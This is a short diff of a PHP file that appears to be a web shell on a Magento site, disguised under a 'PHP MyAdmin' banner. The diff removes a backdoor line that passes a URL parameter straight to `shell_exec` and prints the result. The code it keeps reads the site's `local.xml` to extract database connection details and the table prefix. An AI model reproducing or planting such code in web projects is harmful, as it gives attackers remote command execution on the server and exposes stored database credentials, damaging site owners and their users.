@@ -18,10 +18,10 @@
 	</div>
 	</div>
 	';
-echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
-	if($_GET['HsH']){echo"<pre>".shell_exec($_GET["HsH"]);}
+
 	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
 		$xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
+		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 		if(isset($xml->global->resources->default_setup->connection)) {
 		   $connection = $xml->global->resources->default_setup->connection;
 		   $prefix = $xml->global->resources->db->table_prefix;
